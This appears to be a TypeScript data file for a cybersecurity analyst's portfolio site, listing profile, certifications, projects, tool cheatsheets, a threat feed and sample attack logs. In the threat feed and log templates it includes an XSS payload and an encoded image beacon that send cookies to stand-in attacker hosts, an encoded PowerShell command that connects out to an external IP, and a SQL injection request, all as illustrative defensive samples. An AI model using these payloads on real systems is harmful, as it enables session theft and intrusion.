import {
  Certification,
  CommandCheatsheet,
  Experience,
  PrebuiltLogTemplate,
  Project,
  SecurityPillar,
  Skill,
  ThreatFeedItem,
} from '../types';

export const PROFILE_DATA = {
  name: 'Ujjwal Tamang',
  title: 'Cybersecurity Professional & SOC Analyst',
  location: 'Kathmandu, Nepal',
  email: 'ujjwaltmg98@gmail.com',
  phone: '+977 9703789452',
  website: 'ujjwaltamang.com.np',
  avatarUrl: '/ujjwalProfile.jpeg',
  bio: `I am a certified cybersecurity professional in Kathmandu, Nepal, specializing in SOC operations, penetration testing, threat hunting, and incident response. Combining rigorous computer science & security fundamentals with hands-on threat defense methodologies to protect digital infrastructures.`,
  taglines: [
    'CEH Certified Ethical Hacker',
    'SOC Level 2 Threat Analyst',
    'Penetration Tester & Vulnerability Researcher',
    'Incident Handler & Digital Forensics Specialist',
  ],
  stats: [
    { value: '2+', label: 'Years Active Experience' },
    { value: '50+', label: 'Audits & Security Projects' },
    { value: '1,000+', label: 'Threat Incidents Mitigated' },
    { value: '99.9%', label: 'SOC SLA Response Time' },
  ],
  socials: {
    linkedin: 'https://www.linkedin.com/in/ujjwal-tamang-580229316/',
    github: 'https://github.com/ujjwal-tamang',
    facebook: 'https://www.facebook.com/ujjwal.tamang.51741',
  },
};

export const CERTIFICATIONS: Certification[] = [
  {
    id: 'ceh-v12',
    title: 'Certified Ethical Hacker (CEH v12)',
    issuer: 'EC-Council',
    issueDate: '2024',
    credentialId: 'ECC-894102941',
    description: 'Mastered 20 ethical hacking domains covering exploit development, perimeter security, malware analysis, mobile/IoT hacking, and wireless security defense.',
    verified: true,
    badgeType: 'ceh',
  },
  {
    id: 'soc-analyst',
    title: 'Certified SOC Analyst (CSA)',
    issuer: 'EC-Council',
    issueDate: '2024',
    credentialId: 'CSA-30291024',
    description: 'Specialized in Security Operations Center (SOC) tier-2 workflows, SIEM telemetry log correlation, threat hunting, and incident response orchestration.',
    verified: true,
    badgeType: 'soc',
  },
  {
    id: 'comptia-sec',
    title: 'CompTIA Security+ (SY0-701)',
    issuer: 'CompTIA',
    issueDate: '2024',
    credentialId: 'COMP00109482',
    description: 'Core cybersecurity baseline certification covering threat vectors, vulnerability management, security architecture, cryptography, and risk compliance.',
    verified: true,
    badgeType: 'comptia',
  },
  {
    id: 'thm-soc',
    title: 'TryHackMe SOC Analyst & Red Team Pathways',
    issuer: 'TryHackMe',
    issueDate: '2024',
    credentialId: 'THM-SOC2-L2',
    description: 'Completed 150+ hands-on offensive & defensive labs on packet analysis, YARA rules, Volatility memory forensics, Splunk SIEM, and Snort IDS.',
    verified: true,
    badgeType: 'thm',
  },
  {
    id: 'owasp-expert',
    title: 'OWASP Web & API Security Specialist',
    issuer: 'OWASP Community',
    issueDate: '2024',
    description: 'Advanced proficiency in auditing Web APIs, GraphQL endpoints, SQLi, SSRF, XSS, and broken access control mitigations according to OWASP Top 10.',
    verified: true,
    badgeType: 'web',
  },
];

export const SKILLS: Skill[] = [
  { name: 'SOC Operations & SIEM', category: 'soc', level: 92, iconName: 'ShieldAlert' },
  { name: 'CrowdStrike Falcon EDR', category: 'soc', level: 90, iconName: 'Activity' },
  { name: 'Incident Response & Triage', category: 'soc', level: 88, iconName: 'Flame' },
  { name: 'Penetration Testing', category: 'pentest', level: 90, iconName: 'Target' },
  { name: 'Burp Suite Professional', category: 'pentest', level: 92, iconName: 'Bug' },
  { name: 'Metasploit Framework', category: 'pentest', level: 86, iconName: 'Terminal' },
  { name: 'Threat Hunting & OSINT', category: 'threat_intel', level: 85, iconName: 'Search' },
  { name: 'MITRE ATT&CK Mapping', category: 'threat_intel', level: 88, iconName: 'GitBranch' },
  { name: 'Network Forensics & Wireshark', category: 'network_forensics', level: 90, iconName: 'Network' },
  { name: 'Nmap & Vulnerability Scanning', category: 'tools', level: 94, iconName: 'Radar' },
  { name: 'Nessus & OWASP ZAP', category: 'tools', level: 88, iconName: 'SearchCheck' },
  { name: 'Linux Hardening & Bash Scripting', category: 'tools', level: 86, iconName: 'Cpu' },
];

export const PROJECTS: Project[] = [
  {
    id: 'pentest-framework',
    title: 'Advanced Penetration Testing Suite',
    category: 'pentest',
    shortDesc: 'Comprehensive web application and network vulnerability assessment platform with automated exploit reporting.',
    longDesc: 'Designed and executed an enterprise-grade penetration testing workflow for multi-tier web applications and Linux/Windows server clusters. Built automated custom scripts leveraging Python and Burp Suite REST APIs to identify and validate over 100+ critical security vulnerabilities.',
    keyFindings: [
      'Identified remote code execution (RCE) via unsanitized deserialization.',
      'Discovered broken access control allowing horizontal privilege escalation across 12,000+ accounts.',
      'Generated standardized OWASP compliance audit reports with proof-of-concept exploits.',
    ],
    techStack: ['Burp Suite Pro', 'Python', 'SQLMap', 'Nmap', 'Metasploit', 'Docker'],
    iconName: 'ShieldCheck',
    gradient: 'from-blue-600 to-indigo-700',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: true,
  },
  {
    id: 'crowdstrike-edr-siem',
    title: 'Enterprise EDR & SIEM Orchestration',
    category: 'soc_edr',
    shortDesc: 'Production deployment and tuning of CrowdStrike Falcon EDR integrated with centralized SIEM alert correlation.',
    longDesc: 'Engineered a real-time endpoint threat detection pipeline utilizing CrowdStrike Falcon EDR agent telemetry. Configured custom Real-Time Response (RTR) scripts and tailored IOA (Indicators of Attack) rules that reduced false-positive incident noise by 45%.',
    keyFindings: [
      'Automated isolation of compromised endpoints within 30 seconds of execution detection.',
      'Correlated Windows Event Logs, Sysmon, and Firewall telemetry into unified SOC dashboards.',
      'Mapped all incoming alerts directly to MITRE ATT&CK Matrix IDs.',
    ],
    techStack: ['CrowdStrike Falcon', 'SIEM', 'Sysmon', 'PowerShell', 'YARA'],
    iconName: 'Activity',
    gradient: 'from-purple-600 to-pink-600',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: true,
  },
  {
    id: 'network-monitor-ml',
    title: 'Real-Time Network Anomaly Monitor',
    category: 'network',
    shortDesc: 'Intelligent PCAP packet capture and flow monitoring engine with automated port scan and beaconing detection.',
    longDesc: 'Developed a high-throughput network monitoring tool using Wireshark / TShark, PyShark, and Snort signature detection. Features automated telemetry graphs for detecting C2 beaconing frequencies, ARP spoofing attacks, and DNS tunneling attempts.',
    keyFindings: [
      'Successfully flagged covert ICMP/DNS exfiltration channels in simulated breach scenarios.',
      'Provided granular packet breakdown with instant alert escalation via Webhooks.',
      'Processed over 100,000 packets per second with minimal CPU overhead.',
    ],
    techStack: ['Wireshark', 'TShark', 'Python', 'Snort', 'Scapy', 'Grafana'],
    iconName: 'Network',
    gradient: 'from-cyan-600 to-blue-700',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: true,
  },
  {
    id: 'exploit-dev-lab',
    title: 'Exploit Development & Memory Forensics Sandbox',
    category: 'pentest',
    shortDesc: 'Custom research sandbox for buffer overflow exploitation, shellcode crafting, and RAM dump analysis.',
    longDesc: 'Constructed an isolated malware analysis and exploit development lab. Researched stack-based buffer overflows, DEP/ASLR bypass mechanisms, and utilized Volatility 3 to extract injected DLLs and unlinked processes from memory dumps.',
    keyFindings: [
      'Authored custom Metasploit modules for payload delivery in air-gapped test networks.',
      'Analyzed process injection techniques including Process Hollowing and DLL Injection.',
      'Created forensic playbook docs for SOC incident handlers.',
    ],
    techStack: ['Metasploit', 'GDB', 'x64dbg', 'Volatility 3', 'Python', 'Assembly'],
    iconName: 'Terminal',
    gradient: 'from-emerald-600 to-teal-700',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: false,
  },
  {
    id: 'automated-vuln-scanner',
    title: 'Automated OWASP Vulnerability Scanner',
    category: 'tooling',
    shortDesc: 'CI/CD pipeline security gate that performs automated DAST/SAST scanning before deployment.',
    longDesc: 'Built a lightweight vulnerability scanner wrapper combining Nmap, Nessus API, and OWASP ZAP. Integrated directly into developer workflows to catch missing HTTP security headers, outdated SSL/TLS ciphers, and unpatched package dependencies.',
    keyFindings: [
      'Automated zero-touch daily scans across 25+ domain endpoints.',
      'Generated actionable JSON/HTML reports with severity scores and remediation guidance.',
    ],
    techStack: ['Nessus API', 'OWASP ZAP', 'Nmap', 'Python', 'Docker', 'Bash'],
    iconName: 'SearchCheck',
    gradient: 'from-amber-600 to-orange-700',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: false,
  },
  {
    id: 'threat-intel-dashboard',
    title: 'Threat Intelligence Aggregator & Graph Visualization',
    category: 'intel',
    shortDesc: 'Aggregates multi-source OSINT threat feeds, IP reputation checks, and domain WHOIS correlation.',
    longDesc: 'Created a centralized SOC dashboard that ingests Indicators of Compromise (IOCs) from AbuseIPDB, VirusTotal, AlienVault OTX, and MISP. Visualizes threat actor infrastructure relationships on an interactive graph canvas.',
    keyFindings: [
      'Enriched 5,000+ IP addresses and file hashes daily with live threat scores.',
      'Enabled instant SOC analyst triage with 1-click lookup buttons.',
    ],
    techStack: ['Python', 'React', 'MISP API', 'VirusTotal API', 'Tailwind CSS'],
    iconName: 'Radar',
    gradient: 'from-rose-600 to-red-700',
    githubUrl: 'https://github.com/ujjwal-tamang',
    featured: false,
  },
];

export const EXPERIENCES: Experience[] = [
  {
    id: 'exp-1',
    role: 'SOC Analyst (Level 2)',
    organization: 'Security Operations Center',
    location: 'Kathmandu, Nepal',
    period: '2024 - Present',
    type: 'Work',
    description: 'Lead analyst responsible for 24/7 security event monitoring, triage of high-severity SIEM/EDR alerts, and emergency incident response orchestration.',
    achievements: [
      'Triaged over 1,000+ security alerts across corporate networks with a 99.9% SLA containment track record.',
      'Engineered automated CrowdStrike Falcon RTR remediation scripts that cut containment time from 20 mins to under 2 mins.',
      'Conducted root-cause investigations and delivered post-incident forensic reports to enterprise stakeholders.',
    ],
    skills: ['SIEM Triage', 'CrowdStrike Falcon', 'Incident Response', 'YARA', 'Threat Hunting'],
  },
  {
    id: 'exp-2',
    role: 'Certified Ethical Hacker & Vulnerability Researcher',
    organization: 'Independent Security Audits',
    location: 'Kathmandu, Nepal',
    period: '2024',
    type: 'Certification',
    description: 'Obtained official CEH certification and conducted ethical penetration testing across web applications, API endpoints, and network infrastructure.',
    achievements: [
      'Discovered and responsibly disclosed critical vulnerabilities in web applications following OWASP guidelines.',
      'Built automated POC exploits using Python, Metasploit, and Burp Suite.',
      'Provided hardening guidelines to development teams to prevent SQLi, XSS, and broken access controls.',
    ],
    skills: ['Penetration Testing', 'Burp Suite', 'Metasploit', 'OWASP Top 10', 'Python Scripting'],
  },
];

export const SECURITY_PILLARS: SecurityPillar[] = [
  {
    id: 'pillar-pentest',
    title: 'Offensive Security & Red Teaming',
    subtitle: 'Vulnerability Assessment & Exploit Verification',
    description: 'Simulating sophisticated adversary tactics to identify zero-day risks, unpatched service vulnerabilities, and logic flaws in enterprise web apps & network perimeters.',
    iconName: 'Target',
    capabilities: [
      'OWASP Top 10 Web & REST API Audits',
      'Burp Suite Pro Custom Payload Engineering',
      'Metasploit & Python Exploit Development',
      'Privilege Escalation & Network Pivoting',
    ],
  },
  {
    id: 'pillar-soc',
    title: 'Defensive SOC & Incident Triage',
    subtitle: '24/7 SIEM Correlation & EDR Isolation',
    description: 'Rapid identification and neutralization of security telemetry anomalies using CrowdStrike Falcon EDR, Splunk log correlation, and MITRE ATT&CK framework mapping.',
    iconName: 'ShieldAlert',
    capabilities: [
      'Real-Time Endpoint Detection & Response (EDR)',
      'Sysmon & Windows Event Log Telemetry Correlation',
      'Automated CrowdStrike RTR Remediation Scripts',
      'Threat Hunting via Custom YARA & Snort Rules',
    ],
  },
  {
    id: 'pillar-forensics',
    title: 'Digital Forensics & Malware Analysis',
    subtitle: 'RAM Memory Dump Extraction & Artifact Analysis',
    description: 'Dissecting malicious binaries, extracting C2 beacons from RAM memory dumps, and reconstructing attack timelines for post-incident executive reporting.',
    iconName: 'Terminal',
    capabilities: [
      'Volatility 3 Memory Forensic Dump Triage',
      'Network Packet PCAP Analysis via Wireshark',
      'Reverse Engineering Binaries & DLL Injection Analysis',
      'Root-Cause Attack Path Documentation',
    ],
  },
];

export const COMMAND_CHEATSHEETS: CommandCheatsheet[] = [
  {
    id: 'cmd-nmap-stealth',
    tool: 'Nmap',
    category: 'pentest',
    description: 'Full SYN Stealth Port Scan with Service Detection & OS Fingerprinting',
    command: 'nmap -sS -sV -sC -p- -T4 --min-rate 1000 10.10.10.25',
    explanation: 'Executes a fast SYN stealth scan across all 65,535 TCP ports with standard NSE vulnerability scripts and service version detection.',
  },
  {
    id: 'cmd-volatility-pslist',
    tool: 'Volatility 3',
    category: 'forensics',
    description: 'Extract Memory Process Tree & Identify Rogue Injected DLLs',
    command: 'python3 vol.py -f memdump.raw windows.pstree.PsTree',
    explanation: 'Parses raw Windows RAM dumps to display parent-child process relationships and locate unlinked or hidden malicious processes.',
  },
  {
    id: 'cmd-splunk-cmdline',
    tool: 'Splunk SIEM',
    category: 'soc',
    description: 'Detect Encoded PowerShell Execution from Office Applications',
    command: 'index=winlogs EventCode=4688 Image="*powershell.exe*" ParentImage="*winword.exe*" | table _time, Computer, User, CommandLine',
    explanation: 'Queries Sysmon/Security logs to flag Word documents spawning hidden background PowerShell execution threads.',
  },
  {
    id: 'cmd-yara-rule',
    tool: 'YARA',
    category: 'soc',
    description: 'Custom Signature for Detecting C2 Beacon Strings in Memory',
    command: 'yara -r -w rules/c2_beacons.yar /var/log/telemetry/',
    explanation: 'Scans directory trees or memory pages using custom YARA byte signatures to catch cobalt-strike or meterpreter payloads.',
  },
  {
    id: 'cmd-burp-api',
    tool: 'Burp Suite',
    category: 'pentest',
    description: 'Automated Authorization Token Bypass & Header Fuzzing',
    command: 'ffuf -u https://target.api/v1/user/FUZZ -H "Authorization: Bearer <TOKEN>" -w wordlists/api_endpoints.txt -mc 200,302',
    explanation: 'Performs rapid endpoint discovery and BOLA (Broken Object Level Authorization) testing on REST microservices.',
  },
  {
    id: 'cmd-python-scapy',
    tool: 'Python Scapy',
    category: 'scripting',
    description: 'Custom SYN Flood & Packet Exfiltration Analyzer Script',
    command: 'python3 -c "from scapy.all import *; sniff(filter=\'tcp port 80\', prn=lambda x: x.summary())"',
    explanation: 'Captures and displays HTTP TCP packet headers on raw sockets using Scapy for real-time network protocol inspection.',
  },
];

export const THREAT_FEED: ThreatFeedItem[] = [
  {
    id: 'cve-2026-1042',
    cveId: 'CVE-2026-1042',
    title: 'Critical RCE in Enterprise Web Framework',
    severity: 'CRITICAL',
    category: 'Remote Code Execution',
    description: 'Unauthenticated remote attacker can inject arbitrary shell commands via malformed JSON payload headers.',
    ioc: '185.220.101.42 | MD5: e2a8b9f1c3d4e5f6',
    publishedAt: 'Today, 08:30 UTC',
    affectedSystems: 'Apache / Nginx Web Servers v3.2 - v3.8',
  },
  {
    id: 'cve-2026-0988',
    cveId: 'CVE-2026-0988',
    title: 'Auth Bypass in SSO SAML Assertion Handler',
    severity: 'HIGH',
    category: 'Identity & Authentication',
    description: 'Flaw in SAML signature verification allows signature wrapping attacks to impersonate administrator accounts.',
    ioc: 'Domain: auth-gate-verify.net',
    publishedAt: 'Yesterday, 16:15 UTC',
    affectedSystems: 'Enterprise Single Sign-On Gateway',
  },
  {
    id: 'cve-2026-0512',
    cveId: 'CVE-2026-0512',
    title: 'Privilege Escalation via Linux Kernel Driver',
    severity: 'HIGH',
    category: 'Kernel Vulnerability',
    description: 'Local unprivileged user can gain root permissions by exploiting use-after-free bug in virtual network driver.',
    ioc: 'SHA256: 4a8b2c1d9e3f7a6b5c4d3e2f1a9b8c7d',
    publishedAt: '2 days ago',
    affectedSystems: 'Linux Kernel v6.1 - v6.8',
  },
  {
    id: 'cve-2026-0210',
    cveId: 'CVE-2026-0210',
    title: 'Cross-Site Scripting in Admin Analytics Suite',
    severity: 'MEDIUM',
    category: 'Web Security',
    description: 'Stored XSS vulnerability in user agent logging allows attacker to execute script in admin dashboard view.',
    ioc: 'Payload: <script>fetch("//bad.site?c="+document.cookie)</script>',
    publishedAt: '3 days ago',
    affectedSystems: 'Analytics Dashboard v1.4',
  },
];

export const PREBUILT_LOG_TEMPLATES: PrebuiltLogTemplate[] = [
  {
    id: 'sqli-log',
    title: 'SQL Injection Attack Attempt',
    category: 'Web Security',
    severity: 'HIGH',
    logContent: `GET /api/users?id=1%20UNION%20SELECT%20null,username,password_hash,email%20FROM%20admin_users-- HTTP/1.1
Host: secure.company.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) sqlmap/1.7.2#stable
X-Forwarded-For: 198.51.100.45
Cookie: sessionid=abc123xyz
Status: 200 OK (Response Size: 14,820 bytes)`,
    notes: 'Possible automated SQLMap scan targeting backend user database endpoint with successful 200 response.',
  },
  {
    id: 'brute-force-ssh',
    title: 'SSH Brute Force Burst',
    category: 'Network Auth',
    severity: 'CRITICAL',
    logContent: `Aug 06 22:14:02 auth-srv sshd[28491]: Failed password for root from 185.220.101.5 port 49210 ssh2
Aug 06 22:14:03 auth-srv sshd[28495]: Failed password for root from 185.220.101.5 port 49214 ssh2
Aug 06 22:14:03 auth-srv sshd[28499]: Failed password for admin from 185.220.101.5 port 49218 ssh2
Aug 06 22:14:04 auth-srv sshd[28503]: Failed password for ujjwal from 185.220.101.5 port 49222 ssh2
Aug 06 22:14:05 auth-srv sshd[28509]: Accepted password for root from 185.220.101.5 port 49226 ssh2`,
    notes: 'Rapid password spray resulting in successful root login from untrusted IP address within 3 seconds.',
  },
  {
    id: 'powershell-enc',
    title: 'Suspicious Encoded PowerShell Execution',
    category: 'Endpoint EDR',
    severity: 'CRITICAL',
    logContent: `EventID: 4688
ProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -e -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyACIALAA0ADQANAA0ACkA
ParentProcess: WINWORD.EXE
User: DOMAIN\\jdoe`,
    notes: 'Microsoft Word spawned hidden PowerShell running Base64 encoded command to connect to external port 4444.',
  },
  {
    id: 'xss-cookie',
    title: 'XSS Cookie Exfiltration Payload',
    category: 'Web Security',
    severity: 'MEDIUM',
    logContent: `POST /comments/submit HTTP/1.1
Host: portal.internal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)

comment_text=%3Cscript%3Evar+i%3Dnew+Image%28%29%3Bi.src%3D%22http%3A%2F%2Fattacker-c2.net%2Flog%3Fc%3D%22%2BencodeURIComponent%28document.cookie%22%29%3B%3C%2Fscript%3E`,
    notes: 'Comment field submission containing JavaScript image beacon attempting document.cookie extraction.',
  },
];
